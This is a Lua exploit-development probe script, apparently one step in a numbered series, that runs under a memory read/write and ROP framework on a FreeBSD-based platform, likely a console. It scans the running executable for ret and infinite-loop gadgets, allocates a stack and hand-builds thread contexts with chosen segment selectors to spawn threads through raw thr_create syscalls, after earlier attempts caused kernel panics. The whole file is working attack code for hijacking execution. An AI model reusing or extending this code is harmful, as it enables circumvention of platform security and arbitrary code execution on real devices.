-- CRASH_CLASS: MODERATE
-- PROBE 56p: Refine thr_create — CS=0x43 prevents panic, now fix ret=-1
--
-- Context: 56o confirmed CS=0x43/SS=0x3B prevents kernel panic!
-- But thr_create returned -1 with TID=100933 written.
-- Need to investigate: is the thread alive? What mcontext fields are wrong?
-- Try: FS base from current thread, DS/ES segment selectors,
-- different flag values, null vs gadget RIP.

print("=== PROBE 56p: THR_CREATE REFINEMENT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

collectgarbage("stop")

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

-- Get current thread's FS base using sysarch
print("")
print("--- CURRENT THREAD STATE ---")
local sc_sysarch = make_syscall(165)  -- sysarch

-- GET_FSBASE = 128 (amd64)
local fsbase_buf = memory.alloc(16)
safe_wq(fsbase_buf, uint64(0))
local ok_fs, ret_fs = pcall(function()
    return sc_sysarch(uint64(128), uint64(to_num(fsbase_buf)))
end)
local fsbase = safe_rq(fsbase_buf)
print("sysarch GET_FSBASE(128): ret=" .. tostring(ret_fs) .. " fsbase=" .. fmt_addr(fsbase))

-- GET_GSBASE = 130
local gsbase_buf = memory.alloc(16)
safe_wq(gsbase_buf, uint64(0))
local ok_gs, ret_gs = pcall(function()
    return sc_sysarch(uint64(130), uint64(to_num(gsbase_buf)))
end)
local gsbase = safe_rq(gsbase_buf)
print("sysarch GET_GSBASE(130): ret=" .. tostring(ret_gs) .. " gsbase=" .. fmt_addr(gsbase))

-- Get self TID
local sc_thr_self = make_syscall(432)
local self_tid_buf = memory.alloc(16)
pcall(function() sc_thr_self(uint64(to_num(self_tid_buf))) end)
local self_tid = to_num(safe_rq(self_tid_buf))
print("self_tid=" .. self_tid)

-- Get eboot ret gadget
local sc_info = make_syscall(593)
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
pcall(function() sc_info(uint64(0), info) end)
local eboot_lo = safe_rd(info + 0x108)
local eboot_hi = safe_rd(info + 0x10C)

-- Scan for ret gadget
local ret_gadget = nil
if eboot_lo and eboot_hi then
    local eboot_base = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo))
    local ok_sc, scan_data = pcall(function() return native.read_buffer(eboot_base, 4096) end)
    if ok_sc and scan_data then
        for i = 1, #scan_data do
            if scan_data:byte(i) == 0xC3 then
                ret_gadget = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + i - 1))
                break
            end
        end
    end
end
print("ret_gadget=" .. fmt_addr(ret_gadget))

-- Also find an infinite loop (jmp -2): EB FE
local loop_gadget = nil
if eboot_lo and eboot_hi then
    local eboot_base = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo))
    local ok_sc2, scan_data2 = pcall(function() return native.read_buffer(eboot_base, 0x10000) end)
    if ok_sc2 and scan_data2 then
        for i = 1, #scan_data2 - 1 do
            if scan_data2:byte(i) == 0xEB and scan_data2:byte(i+1) == 0xFE then
                loop_gadget = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + i - 1))
                print("  loop (EB FE) at eboot+" .. string.format("0x%X", i-1))
                break
            end
        end
    end
end

-- Allocate stack
local sc_mmap = make_syscall(477)
local ok_stk, new_stack = pcall(function()
    return sc_mmap(uint64(0), uint64(0x10000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
local stk_h, stk_l = get_hi_lo(new_stack)
print(string.format("stack: 0x%X_%08X", stk_h, stk_l))

-- ============================================================
-- TEST A: Full mcontext with FS base, DS=0x3B, ES=0x3B
-- ============================================================
print("")
print("--- TEST A: FULL MCONTEXT ---")

local uctx = memory.alloc(0x500)
for i = 0, 0x1FF, 4 do safe_wd(uctx + i, 0) end

local mc = to_num(uctx) + 0x10

-- RIP = ret gadget
if ret_gadget then
    local rg_h, rg_l = get_hi_lo(ret_gadget)
    safe_wd(mc + 0xB0, rg_l)
    safe_wd(mc + 0xB4, rg_h)
end

-- CS = 0x43
safe_wd(mc + 0xB8, 0x43)

-- RFLAGS = 0x202
safe_wd(mc + 0xC0, 0x202)

-- RSP
local sp_l = stk_l + 0x10000 - 0x100
safe_wd(mc + 0xC8, sp_l)
safe_wd(mc + 0xCC, stk_h)

-- SS = 0x3B
safe_wd(mc + 0xD0, 0x3B)

-- RBP = RSP
safe_wd(mc + 0x48, sp_l)
safe_wd(mc + 0x4C, stk_h)

-- FS = set the FS base selector
-- On FreeBSD amd64, mc_fs is at +0x88 (2 bytes), mc_gs at +0x8C
-- Set FS base via mc_fsbase at the end of mcontext
-- Actually, FreeBSD mcontext doesn't have fsbase field directly
-- But we might need to copy the current FS base
local fs_h, fs_l = get_hi_lo(fsbase)
-- The FS segment selector on 64-bit is 0 (uses FSBASE MSR)
safe_wd(mc + 0x88, 0)  -- mc_fs
safe_wd(mc + 0x8C, 0)  -- mc_gs

-- DS = 0x3B, ES = 0x3B
safe_wd(mc + 0xA4, 0x3B)  -- mc_ds
safe_wd(mc + 0xA0, 0x3B)  -- mc_es

-- mc_flags at +0x98: set _MC_HASFPXSTATE if needed
-- Actually, let's set mc_flags = 0x1 (MC_HASSEGS)
safe_wd(mc + 0x98, 0x1)

-- Also need mc_len at start of mcontext structure
-- sizeof(mcontext_t) on FreeBSD amd64 = 0x340 (832 bytes)
-- No, mc_onstack is first, then registers

local tid_out = memory.alloc(16)
safe_wq(tid_out, uint64(0))

print("Calling thr_create (full context)...")
local sc_thr = make_syscall(430)
local ok_a, ret_a = pcall(function()
    return sc_thr(uint64(to_num(uctx)), uint64(to_num(tid_out)), uint64(0))
end)
local tid_a = to_num(safe_rq(tid_out))
print("ret=" .. tostring(ret_a) .. " TID=" .. tid_a)

-- Check if thread is alive
if tid_a > 0 then
    local sc_thr_kill = make_syscall(433)
    local ok_tk, ret_tk = pcall(function()
        return sc_thr_kill(uint64(tid_a), uint64(0))
    end)
    print("thr_kill(tid=" .. tid_a .. ",0): ret=" .. tostring(ret_tk))
end

-- ============================================================
-- TEST B: With uc_flags set differently
-- ============================================================
print("")
print("--- TEST B: DIFFERENT UC_FLAGS ---")

-- FreeBSD ucontext_t:
--   +0x00: uc_sigmask (sigset_t = 16 bytes on FreeBSD)
--   +0x10: uc_mcontext
-- Wait — actually on FreeBSD:
--   struct ucontext {
--     sigset_t uc_sigmask;      // 16 bytes
--     mcontext_t uc_mcontext;   // starting at +0x10
--     struct ucontext *uc_link; // after mcontext
--     stack_t uc_stack;         // after link
--     int uc_flags;             // after stack
--   };
-- No — let me check the actual layout

-- Actually, FreeBSD amd64 ucontext is:
-- typedef struct __ucontext {
--     sigset_t    uc_sigmask;
--     mcontext_t  uc_mcontext;
--     struct __ucontext *uc_link;
--     struct sigaltstack  uc_stack;
--     int     uc_flags;
--     int     __spare__[4];
-- };

-- sigset_t on FreeBSD is 16 bytes (4 x uint32)
-- So mcontext starts at +0x10

-- Let me try with different ucontext flag values
-- _UC_SIGMASK = 0x01, _UC_STACK = 0x02, _UC_CPU = 0x04
-- The flags are at uc_flags which is AFTER mcontext and other fields

-- mcontext on amd64 is: 26 registers * 8 = 208 bytes + fpregs + more
-- Actually sizeof(mcontext_t) on FreeBSD amd64 with FPU state is quite large

-- Let me just try setting thr_create flags parameter
-- thr_create(ucontext_t *ctx, long *id, int flags)
-- flags: TDP_RFPPWAIT etc. — usually 0

-- Let me try with flags = 0x2 (THR_SUSPENDED maybe?)
local uctx2 = memory.alloc(0x500)
for i = 0, 0x1FF, 4 do safe_wd(uctx2 + i, 0) end
local mc2 = to_num(uctx2) + 0x10

if ret_gadget then
    local rg_h, rg_l = get_hi_lo(ret_gadget)
    safe_wd(mc2 + 0xB0, rg_l)
    safe_wd(mc2 + 0xB4, rg_h)
end
safe_wd(mc2 + 0xB8, 0x43)  -- CS
safe_wd(mc2 + 0xC0, 0x202)  -- RFLAGS
safe_wd(mc2 + 0xC8, sp_l)  -- RSP
safe_wd(mc2 + 0xCC, stk_h)
safe_wd(mc2 + 0xD0, 0x3B)  -- SS
safe_wd(mc2 + 0x48, sp_l)  -- RBP
safe_wd(mc2 + 0x4C, stk_h)
safe_wd(mc2 + 0xA4, 0x3B)  -- DS
safe_wd(mc2 + 0xA0, 0x3B)  -- ES

local tid_out2 = memory.alloc(16)
safe_wq(tid_out2, uint64(0))

-- Try with a loop gadget as RIP (if found) so the thread stays alive
if loop_gadget then
    local lg_h, lg_l = get_hi_lo(loop_gadget)
    safe_wd(mc2 + 0xB0, lg_l)
    safe_wd(mc2 + 0xB4, lg_h)
    print("Using loop gadget RIP=" .. fmt_addr(loop_gadget))
else
    print("No loop gadget, using ret gadget")
end

print("Calling thr_create (with loop gadget)...")
local ok_b, ret_b = pcall(function()
    return sc_thr(uint64(to_num(uctx2)), uint64(to_num(tid_out2)), uint64(0))
end)
local tid_b = to_num(safe_rq(tid_out2))
print("ret=" .. tostring(ret_b) .. " TID=" .. tid_b)

if tid_b > 0 then
    local sc_thr_kill = make_syscall(433)
    local ok_tk2, ret_tk2 = pcall(function()
        return sc_thr_kill(uint64(tid_b), uint64(0))
    end)
    print("thr_kill(tid=" .. tid_b .. ",0): ret=" .. tostring(ret_tk2))
end

-- ============================================================
-- TEST C: Use fcall_with_rax to call thr_create properly
-- ============================================================
print("")
print("--- TEST C: VIA FCALL_WITH_RAX ---")

-- The make_syscall wrapper might have issues with return value handling
-- Try calling thr_create directly via the ROP framework

-- Actually, let's try gen_fcall_chain for syscall 430
local stub = syscall.pipe.fn_addr

-- First test: simple getpid
local ok_gp, ret_gp = pcall(function() return native.fcall_with_rax(stub, 20) end)
print("getpid via fcall_with_rax: " .. tostring(ret_gp))

-- Prepare fresh ucontext for test C
local uctx3 = memory.alloc(0x500)
for i = 0, 0x1FF, 4 do safe_wd(uctx3 + i, 0) end
local mc3 = to_num(uctx3) + 0x10

if ret_gadget then
    local rg_h, rg_l = get_hi_lo(ret_gadget)
    safe_wd(mc3 + 0xB0, rg_l)
    safe_wd(mc3 + 0xB4, rg_h)
end
safe_wd(mc3 + 0xB8, 0x43)
safe_wd(mc3 + 0xC0, 0x202)
safe_wd(mc3 + 0xC8, sp_l)
safe_wd(mc3 + 0xCC, stk_h)
safe_wd(mc3 + 0xD0, 0x3B)
safe_wd(mc3 + 0x48, sp_l)
safe_wd(mc3 + 0x4C, stk_h)
safe_wd(mc3 + 0xA4, 0x3B)
safe_wd(mc3 + 0xA0, 0x3B)

local tid_out3 = memory.alloc(16)
safe_wq(tid_out3, uint64(0))

-- Use gen_fcall_chain for syscall 430
local ok_gc, chain = pcall(function()
    return native.gen_fcall_chain(stub, 430)
end)
if ok_gc and chain then
    print("gen_fcall_chain(430) ok, type=" .. type(chain))
    -- Try calling it with the ucontext, tid output, and flags
    local ok_c, ret_c = pcall(function()
        return native.fcall(chain, to_num(uctx3), to_num(tid_out3), 0)
    end)
    local tid_c = to_num(safe_rq(tid_out3))
    print("fcall(thr_create): ok=" .. tostring(ok_c) .. " ret=" .. tostring(ret_c) .. " TID=" .. tid_c)

    if tid_c > 0 then
        local sc_thr_kill = make_syscall(433)
        local ok_tk3, ret_tk3 = pcall(function()
            return sc_thr_kill(uint64(tid_c), uint64(0))
        end)
        print("thr_kill(tid=" .. tid_c .. ",0): ret=" .. tostring(ret_tk3))
    end
else
    print("gen_fcall_chain(430) failed: " .. tostring(chain))
end

-- ============================================================
-- TEST D: Check errno after thr_create
-- ============================================================
print("")
print("--- TEST D: ERRNO CHECK ---")

-- Read errno via __error() — might tell us WHY thr_create fails
-- On FreeBSD, errno is thread-local, accessible via __error()
-- But we can also try reading it from the TCB

-- Let's just report what we know
print("Summary of thr_create results:")
print("  Test A: ret=" .. tostring(ret_a) .. " TID=" .. tid_a)
print("  Test B: ret=" .. tostring(ret_b) .. " TID=" .. tid_b)

-- Check all created TIDs
print("")
print("--- CHECKING ALL TIDS ---")
local sc_thr_kill = make_syscall(433)
for _, tid in ipairs({tid_a, tid_b}) do
    if tid > 0 then
        local ok_chk, ret_chk = pcall(function()
            return sc_thr_kill(uint64(tid), uint64(0))
        end)
        print("  thr_kill(tid=" .. tid .. ",0): ok=" .. tostring(ok_chk) .. " ret=" .. tostring(ret_chk))
    end
end

print("")
print("canary=" .. to_num(syscall.getpid()))
print("=== PROBE 56p COMPLETE ===")
